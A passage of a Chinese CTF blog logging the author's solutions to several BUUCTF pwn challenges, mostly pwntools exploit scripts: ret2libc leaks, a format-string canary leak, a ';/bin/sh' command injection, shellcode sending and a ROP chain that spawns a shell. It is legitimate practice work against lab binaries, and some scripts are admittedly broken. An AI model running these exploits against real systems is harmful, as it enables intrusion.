class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x000000000000124b</span> </span><br><span class="line">ret_addr=<span class="number">0x0000000000001016</span></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Show me your magic!&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x410</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">gets_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(gets_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件库</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x410</span>+<span class="number">8</span>),ret_addr,pop_rdi,bin_sh,system_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到libc版本以为都结束了，结果方向错了，题目是传一个shellcode上去</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510003.png" alt="image-20240717111755634"></p>
<p>看到其实并不存在溢出的可能。并且调试看见，plt表可读不可写，所以不使用泄露libc吧</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510740.png" alt="image-20240717112911746"></p>
<p>这里说直接传shellcode就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27060</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>也是得到flag了</p>
<p>flag{94563ff3-8148-4aba-818c-2d2fbcb9bddb}</p>
<h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>2024.7.17</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510898.png" alt="image-20240717140146443"></p>
<p>这里多了一个Canary栈保护，简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511019.png" alt="image-20240717140243537"></p>
<p>扔进ida里面</p>
<p>gift函数看一下，猜测是格式化字符串漏洞</p>
<p>vlnu函数里面有个read函数存在溢出</p>
<p>怎么说呢？是泄露libc版本还是csu呢？</p>
<p>题还是做的太少了！</p>
<hr>
<h3 id="格式化字符串泄露Canary，puts函数泄露libc版本"><a href="#格式化字符串泄露Canary，puts函数泄露libc版本" class="headerlink" title="格式化字符串泄露Canary，puts函数泄露libc版本"></a>格式化字符串泄露Canary，puts函数泄露libc版本</h3><p>利用思路</p>
<blockquote>
<ul>
<li>首先利用格式化字符串漏洞绕过Canary函数</li>
<li>在通过read函数打retlibc</li>
</ul>
</blockquote>
<ul>
<li>首先，</li>
</ul>
<blockquote>
<p>Canary的值是固定的rbp-8</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511601.png" alt="image-20240717144708245"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26355</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">gdb.attach()</span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cancry = <span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400993</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0400887</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">8</span>)+p64(cancry)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">shell_addr = base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">8</span>)+p64(cancry)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(shell_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>​                                   [<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/109515081">BUUCTF]PWN——bjdctf_2020_babyrop2_bjdctf pwn-CSDN博客</a></p>
<h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>2024.7.18</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511151.png" alt="image-20240718091447864"></p>
<p>运行一下，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511660.png" alt="image-20240718091703786"></p>
<p>感觉没啥用，丢进ida里面看一眼</p>
<p>好消息是有system函数</p>
<p>ROPgadget找一下有没有&#x2F;bin&#x2F;sh</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511120.png" alt="image-20240718092131328"></p>
<p>看样子是应该没有。欧克找找漏洞</p>
<p>嘶，找找好像有个read，但感觉又像栈迁移。嗯~，最终还是搜了一手，发现他们的做法，直接nc就行</p>
<p>然后用了有个<strong>；命令</strong>直接解就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在 Linux 命令行中，分号 (;) 是用来分隔多个命令的。</span></span><br></pre></td></tr></table></figure>

<p>我看还有用脚本的，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607941.png" alt="image-20240718094224690"></p>
<p>这里了解一下<strong>strcat函数：意思就是吧buf加在dest后面，但是你还会发现dest是一个指针，所以我们直接给buf赋值&#x2F;bin&#x2F;sh就行。</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25167</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please input the ip address:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p>2024.7.18</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511466.png" alt="image-20240718095818760"></p>
<p>这个感觉会很简单哈</p>
<p>ida里面看一眼</p>
<p>一眼libc版本泄露</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29175</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params1</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr =elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+ p32(write_plt) + p32(main_addr) +p32(<span class="number">1</span>)+ p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建一下libc</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>),system_addr,main_addr,bin_sh])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>嘶，不到为什么找不到版本，也不到为啥，网上扒的wp脚本也都跑不出来，先放着。md</p>
<p>啊啊啊啊啊!调半天整不出来</p>
<h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a>picoctf_2018_buffer overflow 1</h2><p>2024.7.18</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511618.png" alt="image-20240718110315180"></p>
<p>丢进ida里面看一眼</p>
<p>哇塞，gets函数，栈溢出</p>
<p>先看看是不是简单的后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28380</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recv()</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(<span class="number">0x080485CB</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<p>OKOK,BUUCTF今天咋了，连着两个题都连不上啊啊啊啊啊</p>
<p>查了一下wp，就是一个简单的后门。</p>
<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><p>2024.7.18</p>
<p>放着</p>
<h3 id="说是有病毒，放着"><a href="#说是有病毒，放着" class="headerlink" title="说是有病毒，放着"></a>说是有病毒，放着</h3><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p>2024.7.18</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031511215.png" alt="image-20240718144128999"></p>
<p>ida打开</p>
<p>漏洞：gets函数</p>
<p>嘶~看不出来啥</p>
<p>方法：利用工具ROPgadget</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512769.png" alt="image-20240718145124558"></p>
<p>欧克，说是直接溢出就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28061</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">    p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">4</span>)</span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">shell =payload()</span><br><span class="line">r.sendline(shell)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<p>歪日，连着G了这么多么？</p>
<h2 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h2><p>2024.7.18</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512614.png" alt="image-20240718152342204"></p>
<p>运行一下，丢进ida里面</p>
<p>有system函数，找找sh</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512791.png" alt="image-20240718152946847"></p>
<p>没有，有个后门，但是找不到漏洞，看一眼字符串</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512874.png" alt="image-20240718153838801"></p>
<p>简单的后门吗？漏洞是printf函数</p>
<p>那就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p=remote(&#x27;node5.buuoj.cn&#x27;,29298)</span><br><span class="line"></span><br><span class="line">backdoor=0x80485BD</span><br><span class="line">cat_flag=080487E0</span><br><span class="line">payload=b&#x27;A&#x27;*(0x13+4)+p32(backdoor)+p32(main)+p32(cat_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>







<h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><p>2024.7.18</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607942.png" alt="image-20240718164726115"></p>
<p>没什么用，heap感觉应该不会。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607943.png" alt="image-20240718164914973"></p>
<h3 id="堆题-1"><a href="#堆题-1" class="headerlink" title="堆题"></a>堆题</h3><p>放着！！！</p>
<h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h2><p>2024.7.18</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512445.png" alt="image-20240719105916716"></p>
<p>ida里面看一眼</p>
<p>有后门，找一下漏洞，有NX应该打不了ret2shellcode</p>
<p>我感觉应该常规ret2text</p>
<p>好好好，整数溢出</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512803.png" alt="image-20240719111832879"></p>
<p>不确定对不对</p>
<p>上网一搜，原来的堆的题。告辞</p>
<h3 id="堆题-2"><a href="#堆题-2" class="headerlink" title="堆题"></a>堆题</h3><h2 id="PicoCTF-2018-buffer-overflow-2"><a href="#PicoCTF-2018-buffer-overflow-2" class="headerlink" title="PicoCTF_2018_buffer_overflow_2"></a>PicoCTF_2018_buffer_overflow_2</h2><p>2024.7.22</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607944.png" alt="image-20240722163251021"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512638.png" alt="image-20240722163413063"></p>
<p>猜测应该是一个栈溢出的题</p>
<p>丢进ida里面，应该就是一个简单的后门函数！</p>
<p>漏洞是gets函数，后门是win函数 ，直接溢出一下看看。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28213</span>)</span><br><span class="line">backdoor=<span class="number">0x80485CB</span></span><br><span class="line">payload=<span class="string">b&#x27;&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(backdoor)+p32(<span class="number">0xDEADBEEF</span>)+p32(<span class="number">0xDEADC0DE</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>嘶！有个小插曲，忘记有个条件，最后传个参数就好了</p>
<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>2024.7.22</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512367.png" alt="image-20240722183119975"></p>
<p>丢进ida里面看一看，read函数存在漏洞，用puts函数绕过一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512752.png" alt="image-20240722184137449"></p>
